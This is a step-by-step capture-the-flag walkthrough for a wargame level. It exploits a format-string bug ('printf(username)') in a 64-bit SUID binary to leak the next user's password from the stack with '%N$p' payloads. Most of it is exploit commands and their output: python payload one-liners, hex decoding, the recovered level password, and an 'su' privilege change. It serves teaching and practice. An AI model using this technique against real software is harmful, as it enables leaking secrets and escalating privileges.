# Level 02 - Practical walkthrough

> 🔓 **Flaw:** format-string bug - `printf(username)` with no format specifier
> 🎯 **Target:** the next password, sitting on the stack (read from `/home/users/level03/.pass`)
> 🛠️ **Technique:** leak stack words with `%N$p`, then decode them (hex → ASCII → reverse).

All commands are run as user `level02`. This binary is **64-bit** (each `%p` prints an
8-byte word).

## 1. Observe the program

🟦 **Goal:** confirm the SUID bit and the login flow.

🟨 **Terminal:**

```bash
ls -l ./level02
./level02
```

⬜ **Output:**

```text
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: me!
--[ Password: mine!
*****************************************
me! does not have access!
```

Owned by `level03` and SUID. Notice the error line echoes our username (`me!`) - a strong
hint that the username is passed straight to `printf`.

## 2. Understand the program

🟦 **Goal:** locate the password in memory and confirm the format-string bug.

🟨 **Terminal:**

```bash
gdb ./level02
```

🟨 **GDB:**

```gdb
disassemble main
```

Reading `main`:

- It `fopen`s `/home/users/level03/.pass` and `fread`s 41 bytes into a **stack** buffer.
- It reads our username and password from stdin.
- It compares our password with the real one via `strncmp(..., 41)` - unbreakable directly.
- On failure it calls `printf(username)` **without a format string**. That is the way in:
  our username is interpreted as a format string, so `%p` specifiers leak stack words.

## 3. Confirm the leak

🟦 **Goal:** verify that `%p` in the username dumps the stack.

🟨 **Terminal:**

```bash
(python -c 'print("AAAA %p %p %p %p %p %p")'; echo pass; cat) | ./level02
```

⬜ **Output (excerpt):**

```text
AAAA 0x... (nil) 0x... 0x2a2a2a2a2a2a2a2a ...
```

The `0x2a2a...` words are the `*` banner; walking further along the argument list we reach
the password buffer. Direct parameter access (`%N$p`) lets us jump straight to it.

## 4. Find which arguments hold the password

🟦 **Goal:** locate the exact stack positions of the password by dumping the stack and
scanning for printable ASCII. First attempt, label every value with its index:

🟨 **Terminal:**

```bash
(python -c 'print " ".join("%d:%%%d$p" % (i,i) for i in range(1,41))'; echo x; cat) | ./level02
```

⬜ **Output (cut short):**

```text
1:0x... 2:(nil) ... 8:0x70243431253a3431 ... 13:0x3a3931207024383  does not have access!
```

Two lessons here: the dump stops around index 13 because `username` is only a **100-byte
buffer** (`fgets(username, 100, ...)`), so the long format string is truncated; and the
words from index 8 on (`0x70243431...` decodes to `"14:%14$p"`) are **our own input** echoed
back, so our buffer sits around argument 8.

🟦 **Goal:** because the string must stay under 100 bytes, scan a **window** that fits. Dump
positions 15-30 compactly (no labels), then count along the output:

🟨 **Terminal:**

```bash
(python -c 'print " ".join("%%%d$p" % i for i in range(15,31))'; echo x; cat) | ./level02
```

⬜ **Output:**

```text
(nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) ...
```

The first value is argument 15, so counting along: arguments **22-26** are the five
consecutive words whose bytes are all printable ASCII (`0x756e...` = `"Hh74RPnu"`). They are
bounded by non-ASCII on both sides (arg 21 and arg 27 are `(nil)`), and 5 words x 8 bytes =
40 = the password length, which confirms 22 is the start and 26 is the end.

## 5. Read the password in order

🟦 **Goal:** now that we know it's at 22-26, dump those directly, from 26 down to 22 so the
words line up:

🟨 **Terminal:**

```bash
(python -c 'print("%26$p%25$p%24$p%23$p%22$p")'; echo pass; cat) | ./level02
```

⬜ **Output (the username echo line):**

```text
0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
```

🟦 **Goal:** decode the leaked words. Each 8-byte word is stored little-endian, so we convert
hex → raw bytes and reverse.

🟨 **Terminal:**

```bash
echo 0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 | xxd -r -p | rev
```

⬜ **Output:**

```text
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

That is `level03`'s password.

## 6. Move to the next level

🟨 **Terminal:**

```bash
su level03
```

🟨 **At the `su` prompt** type only the value (`Password:` is printed by `su`):

- `Password:` → `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

🟨 **In the shell:**

```bash
whoami
```

⬜ **Output:**

```text
level03
```

> Note: we could also log in through the program itself - once we know the password, typing
> it as both prompts reaches `system("/bin/sh")` with `level03`'s rights. Reading `.pass`
> after `su` is simply the cleanest proof.
